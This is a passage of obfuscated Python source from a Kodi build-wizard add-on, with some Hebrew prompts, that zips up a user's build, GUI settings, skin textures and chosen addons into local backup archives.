        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם ברצונך לגבות את הבילד?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR red]ביטול[/COLOR][/B]",yeslabel ="[B][COLOR green]גיבוי[/COLOR][/B]"):#line:2033
            if name =="":#line:2034
                name =getKeyboard ("","אנא הכנס שם ל %s באנגלית"%O00OO0OOO00OO00OO )#line:2035
                if not name :return False #line:2036
                name =name .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:2037
            name =urllib .quote_plus (name );OOO00OO0O0OOOOOOO =''#line:2038
            O0OOO0O000O0O0OOO =os .path .join (OOOOO00000OO0OOOO ,'%s.zip'%name )#line:2039
            OOOOO0O00OO000OOO =0 #line:2040
            OOO00OO0OOO0O00OO =[]#line:2041
            if not DIALOG .yesno (ADDONTITLE ,"האם לשמור את תיקית האדון דאטה?",yeslabel ='[B][COLOR green]שמור[/COLOR][/B]',nolabel ='[B][COLOR red]לא לשמור[/COLOR][/B]'):#line:2042
                O0OO00000O000O00O .append ('addon_data')#line:2043
            convertSpecial (HOME ,True )#line:2044
            asciiCheck (HOME ,True )#line:2045
            try :#line:2046
                OO0OOOOOO000OO0O0 =zipfile .ZipFile (translatepath (O0OOO0O000O0O0OOO ),mode ='w')#line:2047
            except :#line:2048
                try :#line:2049
                    OOO00OO0O0OOOOOOO =os .path .join (PACKAGES ,'%s.zip'%name )#line:2050
                    OO0OOOOOO000OO0O0 =zipfile .ZipFile (OOO00OO0O0OOOOOOO ,mode ='w')#line:2051
                except :#line:2052
                    log ("Unable to create %s.zip"%name ,5 )#line:2053
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2054
                        openS ()#line:2055
                        return #line:2056
                    else :#line:2057
                        return #line:2058
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2059
            for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (HOME ):#line:2060
                O0OOOO0000OOO0O0O [:]=[OOO00OO00OOO0OOOO for OOO00OO00OOO0OOOO in O0OOOO0000OOO0O0O if OOO00OO00OOO0OOOO not in O0OO00000O000O00O ]#line:2061
                OOO0OO0O00O0OOO00 [:]=[OO00OOO00OOO0OO00 for OO00OOO00OOO0OO00 in OOO0OO0O00O0OOO00 if OO00OOO00OOO0OO00 not in OO00000000OOO0OOO ]#line:2062
                for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2063
                    OOO00OO0OOO0O00OO .append (OO0O00000O0OOOO00 )#line:2064
            O0O0OOO00O000OO0O =len (OOO00OO0OOO0O00OO )#line:2065
            for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (HOME ):#line:2066
                O0OOOO0000OOO0O0O [:]=[O00O0OOO0OO00OO0O for O00O0OOO0OO00OO0O in O0OOOO0000OOO0O0O if O00O0OOO0OO00OO0O not in O0OO00000O000O00O ]#line:2067
                OOO0OO0O00O0OOO00 [:]=[O0O00OOOO0OOOO00O for O0O00OOOO0OOOO00O in OOO0OO0O00O0OOO00 if O0O00OOOO0OOOO00O not in OO00000000OOO0OOO ]#line:2068
                for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2069
                    try :#line:2070
                        OOOOO0O00OO000OOO +=1 #line:2071
                        OOOOOOO000O00OOO0 =percentage (OOOOO0O00OO000OOO ,O0O0OOO00O000OO0O )#line:2072
                        DP .update (int (OOOOOOO000O00OOO0 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO0O00OO000OOO ,COLOR1 ,O0O0OOO00O000OO0O ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O00000O0OOOO00 ),'')#line:2073
                        OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2074
                        if OO0O00000O0OOOO00 in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2075
                        elif os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )in O00000000OOO000O0 :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2076
                        elif os .path .join ('addons','packages')in OOOOOO00OOO0000OO :log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2077
                        elif OO0O00000O0OOOO00 .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2078
                        elif OO0O00000O0OOOO00 .endswith ('.pyo'):continue #line:2079
                        elif OO0O00000O0OOOO00 .endswith ('.db')and 'Database'in O0OO0OO0OO0O0O0OO :#line:2080
                            O0OOO0O0OO0OOOOOO =OO0O00000O0OOOO00 .replace ('.db','')#line:2081
                            O0OOO0O0OO0OOOOOO =''.join ([O00O0OO0O00O000OO for O00O0OO0O00O000OO in O0OOO0O0OO0OOOOOO if not O00O0OO0O00O000OO .isdigit ()])#line:2082
                            if O0OOO0O0OO0OOOOOO in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2083
                                if not OO0O00000O0OOOO00 ==latestDB (O0OOO0O0OO0OOOOOO ):log ("[Back Up] Type = '%s': Ignore %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 );continue #line:2084
                        try :#line:2085
                            OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2086
                        except :pass #line:2087
                    except :pass #line:2088
            OO0OOOOOO000OO0O0 .close ()#line:2089
            xbmc .sleep (500 )#line:2090
            DP .update (100 ,"Creating %s_guisettings.zip"%name ,"","")#line:2091
            backUpOptions ('guifix',name )#line:2092
            if not OOO00OO0O0OOOOOOO =='':#line:2093
                OO00000O00OO0000O =xbmcvfs .rename (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2094
                if OO00000O00OO0000O ==0 :#line:2095
                    xbmcvfs .copy (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2096
                    xbmcvfs .delete (OOO00OO0O0OOOOOOO )#line:2097
            DP .close ()#line:2098
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR] [COLOR %s]backup successful:[/COLOR]"%(COLOR1 ,name ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O000O0O0OOO ))#line:2099
    elif O00OO0OOO00OO00OO =="guifix":#line:2100
        if name =="":#line:2101
            OO0O00O00O0OO0O00 =getKeyboard ("","Please enter a name for the %s zip"%O00OO0OOO00OO00OO )#line:2102
            if not OO0O00O00O0OO0O00 :return False #line:2103
            convertSpecial (USERDATA ,True )#line:2104
            asciiCheck (USERDATA ,True )#line:2105
        else :OO0O00O00O0OO0O00 =name #line:2106
        OO0O00O00O0OO0O00 =urllib .quote_plus (OO0O00O00O0OO0O00 );O0O000OOO00O0O0O0 =''#line:2107
        OO00OOOOO00OO00OO =translatepath (os .path .join (OOOOO00000OO0OOOO ,'%s_guisettings.zip'%OO0O00O00O0OO0O00 ))#line:2108
        if os .path .exists (GUISETTINGS ):#line:2109
            try :#line:2110
                OO0OOOOOO000OO0O0 =zipfile .ZipFile (OO00OOOOO00OO00OO ,mode ='w')#line:2111
            except :#line:2112
                try :#line:2113
                    O0O000OOO00O0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O00O00O0OO0O00 )#line:2114
                    OO0OOOOOO000OO0O0 =zipfile .ZipFile (O0O000OOO00O0O0O0 ,mode ='w')#line:2115
                except :#line:2116
                    log ("Unable to create %s_guisettings.zip"%OO0O00O00O0OO0O00 ,5 )#line:2117
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2118
                        openS ()#line:2119
                        return #line:2120
                    else :#line:2121
                        return #line:2122
            try :#line:2123
                OO0OOOOOO000OO0O0 .write (GUISETTINGS ,'guisettings.xml',zipfile .ZIP_DEFLATED )#line:2124
                OO0OOOOOO000OO0O0 .write (PROFILES ,'profiles.xml',zipfile .ZIP_DEFLATED )#line:2125
                O0O0OOO00O0000O00 =glob .glob (os .path .join (ADDOND ,'skin.*',''))#line:2126
                log (str (O0O0OOO00O0000O00 ),5 )#line:2127
                for OO0O00O00OO0OO0OO in O0O0OOO00O0000O00 :#line:2128
                    OOOO0OO0OO0000OOO =os .path .split (OO0O00O00OO0OO0OO [:-1 ])[1 ]#line:2129
                    if not OOOO0OO0OO0000OOO in ['skin.confluence','skin.re-touch','skin.estuary','skin.myconfluence','skin.estouchy','skin.anonymous.mod','skin.anonymous.nox','skin.Premium.mod']:#line:2130
                        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to add the following skin folder to the GuiFix Zip File?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OO0OO0000OOO ),yeslabel ="[B][COLOR green]Add Skin[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Skin[/COLOR][/B]"):#line:2131
                            for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (os .path .join (ADDOND ,OO0O00O00OO0OO0OO )):#line:2132
                                OOO0OO0O00O0OOO00 [:]=[OOOOO0OO0OOO0OOOO for OOOOO0OO0OOO0OOOO in OOO0OO0O00O0OOO00 if OOOOO0OO0OOO0OOOO not in OO00000000OOO0OOO ]#line:2133
                                for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2134
                                    OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2135
                                    OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2136
                            O0O0OOO00O0000O00 =parseDOM (link ,'import',ret ='addon')#line:2137
                            if 'script.skinshortcuts'in O0O0OOO00O0000O00 :#line:2138
                                for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2139
                                    OOO0OO0O00O0OOO00 [:]=[OOOOO0O000OO00O0O for OOOOO0O000OO00O0O in OOO0OO0O00O0OOO00 if OOOOO0O000OO00O0O not in OO00000000OOO0OOO ]#line:2140
                                    for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2141
                                        OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2142
                                        OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2143
                        else :log ("[Back Up] Type = '%s': %s ignored"%(O00OO0OOO00OO00OO ,OO0O00O00OO0OO0OO ),5 )#line:2144
            except Exception as OO000O00OO0OOO000 :#line:2145
                log ("[Back Up] Type = '%s': %s"%(O00OO0OOO00OO00OO ,OO000O00OO0OOO000 ),5 )#line:2146
                pass #line:2147
            OO0OOOOOO000OO0O0 .close ()#line:2148
            if not O0O000OOO00O0O0O0 =='':#line:2149
                OO00000O00OO0000O =xbmcvfs .rename (O0O000OOO00O0O0O0 ,OO00OOOOO00OO00OO )#line:2150
                if OO00000O00OO0000O ==0 :#line:2151
                    xbmcvfs .copy (O0O000OOO00O0O0O0 ,OO00OOOOO00OO00OO )#line:2152
                    xbmcvfs .delete (O0O000OOO00O0O0O0 )#line:2153
        else :log ("[Back Up] Type = '%s': guisettings.xml not found"%O00OO0OOO00OO00OO ,5 )#line:2154
        if name =="":#line:2155
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]GuiFix backup successful:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OOOOO00OO00OO ))#line:2156
    elif O00OO0OOO00OO00OO =="theme":#line:2157
        if not DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to create a theme backup?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Continue[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):LogNotify ("Theme Backup","Cancelled!");return False #line:2158
        if name =="":#line:2159
            OO0O0O0000OOO00OO =getKeyboard ("","Please enter a name for the %s zip"%O00OO0OOO00OO00OO )#line:2160
            if not OO0O0O0000OOO00OO :return False #line:2161
        else :OO0O0O0000OOO00OO =name #line:2162
        OO0O0O0000OOO00OO =urllib .quote_plus (OO0O0O0000OOO00OO );OOO00OO0O0OOOOOOO =''#line:2163
        O0OOO0O000O0O0OOO =os .path .join (OOOOO00000OO0OOOO ,'%s.zip'%OO0O0O0000OOO00OO )#line:2164
        try :#line:2165
            OO0OOOOOO000OO0O0 =zipfile .ZipFile (translatepath (O0OOO0O000O0O0OOO ),mode ='w')#line:2166
        except :#line:2167
            try :#line:2168
                OOO00OO0O0OOOOOOO =os .path .join (PACKAGES ,'%s.zip'%OO0O0O0000OOO00OO )#line:2169
                OO0OOOOOO000OO0O0 =zipfile .ZipFile (OOO00OO0O0OOOOOOO ,mode ='w')#line:2170
            except :#line:2171
                log ("Unable to create %s.zip"%OO0O0O0000OOO00OO ,5 )#line:2172
                if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2173
                    openS ()#line:2174
                    return #line:2175
                else :#line:2176
                    return #line:2177
        convertSpecial (USERDATA ,True )#line:2178
        asciiCheck (USERDATA ,True )#line:2179
        try :#line:2180
            if not SKIN =='skin.confluence':#line:2181
                O0O0O0O0OO0OO0O0O =os .path .join (ADDONS ,SKIN ,'media')#line:2182
                O0O00OO0OOOOO0000 =glob .glob (os .path .join (O0O0O0O0OO0OO0O0O ,'*.xbt'))#line:2183
                if len (O0O00OO0OOOOO0000 )>1 :#line:2184
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go through the Texture Files for?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2185
                        O0O0O0O0OO0OO0O0O =os .path .join (ADDONS ,SKIN ,'media')#line:2186
                        O0O00OO0OOOOO0000 =glob .glob (os .path .join (O0O0O0O0OO0OO0O0O ,'*.xbt'))#line:2187
                        for O00O0OOO00000O0OO in O0O00OO0OOOOO0000 :#line:2188
                            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR1 ,COLOR2 ,O00O0OOO00000O0OO .replace (O0O0O0O0OO0OO0O0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2189
                                OOOOOO00OOO0000OO =O00O0OOO00000O0OO #line:2190
                                OO000O000OOOO0000 =OOOOOO00OOO0000OO .replace (HOME ,"")#line:2191
                                OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OO000O000OOOO0000 ,zipfile .ZIP_DEFLATED )#line:2192
                else :#line:2193
                    for O00O0OOO00000O0OO in O0O00OO0OOOOO0000 :#line:2194
                        if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR2 ,COLOR1 ,O00O0OOO00000O0OO .replace (O0O0O0O0OO0OO0O0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2195
                            OOOOOO00OOO0000OO =O00O0OOO00000O0OO #line:2196
                            OO000O000OOOO0000 =OOOOOO00OOO0000OO .replace (HOME ,"")#line:2197
                            OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OO000O000OOOO0000 ,zipfile .ZIP_DEFLATED )#line:2198
                O0OO000000000OOO0 =os .path .join (ADDOND ,SKIN ,'settings.xml')#line:2199
                if os .path .exists (O0OO000000000OOO0 ):#line:2200
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] in [COLOR %s]/addon_data/[/COLOR] for?"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2201
                        O0O0O0O0OO0OO0O0O =os .path .join (ADDOND ,SKIN )#line:2202
                        OO0OOOOOO000OO0O0 .write (O0OO000000000OOO0 ,O0OO000000000OOO0 .replace (HOME ,""),zipfile .ZIP_DEFLATED )#line:2203
                OO0OO0O0O0O000O0O =open (os .path .join (ADDONS ,SKIN ,'addon.xml'));O0000O000O000OO00 =OO0OO0O0O0O000O0O .read ();OO0OO0O0O0O000O0O .close ()#line:2204
                O0O0OOO00O0000O00 =parseDOM (O0000O000O000OO00 ,'import',ret ='addon')#line:2205
                if 'script.skinshortcuts'in O0O0OOO00O0000O00 :#line:2206
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] for [COLOR %s]script.skinshortcuts[/COLOR]?"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2207
                        for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2208
                            OOO0OO0O00O0OOO00 [:]=[O0OO000O0OO00O0O0 for O0OO000O0OO00O0O0 in OOO0OO0O00O0OOO00 if O0OO000O0OO00O0O0 not in OO00000000OOO0OOO ]#line:2209
                            for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2210
                                OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2211
                                OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2212
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include a [COLOR %s]Backgrounds[/COLOR] folder?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2213
                OOOOOO00OOO0000OO =DIALOG .browse (0 ,'Select location of backgrounds','files','',True ,False ,HOME ,False )#line:2214
                if not OOOOOO00OOO0000OO ==HOME :#line:2215
                    for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (OOOOOO00OOO0000OO ):#line:2216
                        O0OOOO0000OOO0O0O [:]=[OOO0OO0O0OOOOOOO0 for OOO0OO0O0OOOOOOO0 in O0OOOO0000OOO0O0O if OOO0OO0O0OOOOOOO0 not in O0OO00000O000O00O ]#line:2217
                        OOO0OO0O00O0OOO00 [:]=[O00O00OOO00OO0000 for O00O00OOO00OO0000 in OOO0OO0O00O0OOO00 if O00O00OOO00OO0000 not in OO00000000OOO0OOO ]#line:2218
                        for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2219
                            try :#line:2220
                                OO000O000OOOO0000 =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2221
                                OO0OOOOOO000OO0O0 .write (OO000O000OOOO0000 ,OO000O000OOOO0000 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2222
                            except Exception as OO000O00OO0OOO000 :#line:2223
                                log ("[Back Up] Type = '%s': Unable to backup %s"%(O00OO0OOO00OO00OO ,OO0O00000O0OOOO00 ),5 )#line:2224
                                log ("Backup Error: %s"%str (OO000O00OO0OOO000 ),5 )#line:2225
                OOO0O000OO00O0O00 =latestDB ('Textures')#line:2226
                if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOO0O000OO00O0O00 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2227
                    OO0OOOOOO000OO0O0 .write (os .path .join (DATABASE ,OOO0O000OO00O0O00 ),'/userdata/Database/%s'%OOO0O000OO00O0O00 ,zipfile .ZIP_DEFLATED )#line:2228
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include any addons?[/COLOR]"%(COLOR2 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2229
                OO0O00O00OO0OO0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2230
                OO00OO0O0O0O0OOOO =[];O00OOOOO00OOOOOO0 =[]#line:2231
                for OO00O0O0O0OO0O0O0 in sorted (OO0O00O00OO0OO0OO ,key =lambda OO00O00OO00OO00OO :OO00O00OO00OO00OO ):#line:2232
                    OOO00O0O0O0O00OOO =os .path .split (OO00O0O0O0OO0O0O0 [:-1 ])[1 ]#line:2233
                    if OOO00O0O0O0O00OOO in EXCLUDES :continue #line:2234
                    elif OOO00O0O0O0O00OOO in DEFAULTPLUGINS :continue #line:2235
                    elif OOO00O0O0O0O00OOO =='packages':continue #line:2236
                    O0000O00OO00O00OO =os .path .join (OO00O0O0O0OO0O0O0 ,'addon.xml')#line:2237
                    if os .path .exists (O0000O00OO00O00OO ):#line:2238
                        OO0OO0O0O0O000O0O =open (O0000O00OO00O00OO )#line:2239
                        OOO0OOO0O000O0000 =OO0OO0O0O0O000O0O .read ()#line:2240
                        O0O0OOO00O0000O00 =parseDOM (OOO0OOO0O000O0000 ,'addon',ret ='name')#line:2241
                        if len (O0O0OOO00O0000O00 )>0 :#line:2242
                            OO00OO0O0O0O0OOOO .append (O0O0OOO00O0000O00 [0 ])#line:2243
                            O00OOOOO00OOOOOO0 .append (OOO00O0O0O0O00OOO )#line:2244
                        else :#line:2245
                            OO00OO0O0O0O0OOOO .append (OOO00O0O0O0O00OOO )#line:2246
                            O00OOOOO00OOOOOO0 .append (OOO00O0O0O0O00OOO )#line:2247
                if KODIV >16 :#line:2248
                    O000OO0O000000OOO =DIALOG .multiselect ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,OO00OO0O0O0O0OOOO )#line:2249
                else :#line:2250
                    O000OO0O000000OOO =[];O0000OO0OO00OOOO0 =0 #line:2251
                    OOO0OO0OOO0O0O00O =["-- Click here to Continue --"]+OO00OO0O0O0O0OOOO #line:2252
                    while not O0000OO0OO00OOOO0 ==-1 :#line:2253
                        O0000OO0OO00OOOO0 =DIALOG .select ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,OOO0OO0OOO0O0O00O )#line:2254
                        if O0000OO0OO00OOOO0 ==-1 :break #line:2255
                        elif O0000OO0OO00OOOO0 ==0 :break #line:2256
                        else :#line:2257
                            OOO00000OO0O0O0O0 =(O0000OO0OO00OOOO0 -1 )#line:2258
                            if OOO00000OO0O0O0O0 in O000OO0O000000OOO :#line:2259
                                O000OO0O000000OOO .remove (OOO00000OO0O0O0O0 )#line:2260
                                OOO0OO0OOO0O0O00O [O0000OO0OO00OOOO0 ]=OO00OO0O0O0O0OOOO [OOO00000OO0O0O0O0 ]#line:2261
                            else :#line:2262
                                O000OO0O000000OOO .append (OOO00000OO0O0O0O0 )#line:2263
                                OOO0OO0OOO0O0O00O [O0000OO0OO00OOOO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO00OO0O0O0O0OOOO [OOO00000OO0O0O0O0 ])#line:2264
                if len (O000OO0O000000OOO )>0 :#line:2265
                    for OOOO00O00000O0OOO in O000OO0O000000OOO :#line:2266
                        for O0OO0OO0OO0O0O0OO ,O0OOOO0000OOO0O0O ,OOO0OO0O00O0OOO00 in os .walk (os .path .join (ADDONS ,O00OOOOO00OOOOOO0 [OOOO00O00000O0OOO ])):#line:2267
                            OOO0OO0O00O0OOO00 [:]=[OOO00OO000O0O0O0O for OOO00OO000O0O0O0O in OOO0OO0O00O0OOO00 if OOO00OO000O0O0O0O not in OO00000000OOO0OOO ]#line:2268
                            for OO0O00000O0OOOO00 in OOO0OO0O00O0OOO00 :#line:2269
                                if OO0O00000O0OOOO00 .endswith ('.pyo'):continue #line:2270
                                OOOOOO00OOO0000OO =os .path .join (O0OO0OO0OO0O0O0OO ,OO0O00000O0OOOO00 )#line:2271
                                OO0OOOOOO000OO0O0 .write (OOOOOO00OOO0000OO ,OOOOOO00OOO0000OO [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2272
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]guisettings.xml[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2273
                OO0OOOOOO000OO0O0 .write (GUISETTINGS ,'/userdata/guisettings.xml',zipfile .ZIP_DEFLATED )#line:2274
        except Exception as OO000O00OO0OOO000 :#line:2275
            OO0OOOOOO000OO0O0 .close ()#line:2276
            log ("[Back Up] Type = '%s': %s"%(O00OO0OOO00OO00OO ,str (OO000O00OO0OOO000 )),5 )#line:2277
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip failed:[/COLOR]"%(COLOR1 ,OO0O0O0000OOO00OO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OO000O00OO0OOO000 )))#line:2278
            if not OOO00OO0O0OOOOOOO =='':#line:2279
                try :os .remove (translatepath (OOO00OO0O0OOOOOOO ))#line:2280
                except Exception as OO000O00OO0OOO000 :log (str (OO000O00OO0OOO000 ))#line:2281
            else :#line:2282
                try :os .remove (translatepath (O0OOO0O000O0O0OOO ))#line:2283
                except Exception as OO000O00OO0OOO000 :log (str (OO000O00OO0OOO000 ))#line:2284
            return #line:2285
        OO0OOOOOO000OO0O0 .close ()#line:2286
        if not OOO00OO0O0OOOOOOO =='':#line:2287
            OO00000O00OO0000O =xbmcvfs .rename (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2288
            if OO00000O00OO0000O ==0 :#line:2289
                xbmcvfs .copy (OOO00OO0O0OOOOOOO ,O0OOO0O000O0O0OOO )#line:2290
                xbmcvfs .delete (OOO00OO0O0OOOOOOO )#line:2291
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip successful:[/COLOR]"%(COLOR1 ,OO0O0O0000OOO00OO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O000O0O0OOO ))#line:2292
    elif O00OO0OOO00OO00OO =="addondata":#line:2293
